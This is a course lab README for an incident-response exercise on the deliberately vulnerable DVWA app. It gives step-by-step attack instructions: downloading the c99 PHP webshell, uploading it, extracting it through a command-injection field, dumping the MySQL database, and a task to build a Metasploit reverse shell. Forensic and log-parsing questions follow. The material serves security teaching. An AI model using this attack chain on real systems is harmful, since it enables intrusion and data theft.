# Week 1 - Dam Vulnerable Web App(DVWA)
This week we are using DVWA for our incident response demo. DVWA provides a broken webapp that is ready to be hacked out of the box. Docker was platform of choice because if a container becomes corrupted just restart it :).

## Setup demo
### AWS security group
0. Restrict AWS security group to RIT IP address range

### Setup DVWA on AWS Ubuntu 16.04
0. vim hosts and add IP addr of host under "[dvwa]"
0. ansible-playbook -i hosts deploy_dvwa.yml

### Access Docker container
0. ssh to host
0. docker exec -it dvwa_demo bash

## Perform attack
### Nikto scanner
0. nikto -host http://52.53.172.255

### Zip, upload and unzip c99.php
0. Start Kali Linux VM
0. wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php
0. gzip -f c99.php
0. Browse http://<IP addr of DVWA> with CHROME and login
    1. User: admin
    1. Pass: password
0. Select "Upload" on the left
0. Select "Choose file", "c99.php.gz" then "Upload"
0. Select "Command injection" on the right
0. Enter "/bin/gunzip -v ../../hackable/uploads/c99.php" into "Enter ip address"
0. Browse to http://<IP addr of DVWA>/hackable/uploads/c99.php

### Dump database
0. mysql -u root -e "show databases;"
    1. There is no root password
0. mysql -u root -e "use dvwa; show tables"
0. mysqldump -u root --database dvwa

## Incident reponse demo
### Understanding the machine
It is important to understand the machine you are investigating
0. What is the operating system of the attacker machine?
0. What is the kernel of the attacked machine?
0. What timezone  of the attacked machine?
0. What is the ip address of the attacked machine?
0. What is the MAC address of the attacked machine?
0. What is the hostname of the attacked machine?
0. What services are listening on the box and what ports?(hint netstat)?
0. What are the versions of the services?
0. Do the services have any known vulnerabilities?
0. What users are on the attacked machine?

### Become the cyber detective
0. Where are the web servers logs located?
0. What is the diff between the error.log and access.log
0. What are the user permissions of the log files?
0. What is the timezone and time format of the webservers logs
0. What is the attacker's IP address
0. What is the attackers user-agent?
0. What webshell did the attacker use?
0. Where was that webshell uploaded to?
0. What commands/actions did the attacker use?
0. Lookup three mitigations for next week

### Scripting challenges
0. Create a Github account and repo called “DFIRtooklit”
    1. Choose your own repo name
    1. Repo can be private or public -- your choice - mine is private
    1. If you don’t create a repo you receive no points for everything else
0. Create a script in your language of choice to do everything in the “understanding the machine” and then add three of your own.
    1. Create a script(s) that will parse webserver logs for:
    1. Unique list(no duplicates) of user ip addresses
    1. Unique list(no duplicates) of URIs 
    1. Unique list(no duplicates) of CMDs run by c99
    1. Unique list(no duplicates) of CMD responses by c99
    1. OUTPUT MUST BE PRETTY


### Red team challenge
Create a PHP reverse shell with Metasploit
* attack: http://<IP addr of DVWA>:8080
* DO NOT ATTACK port 80

### Restart Docker container if corrupted
0. docker restart dvwa_pwn

# Resources/Sources
* https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson14/index.html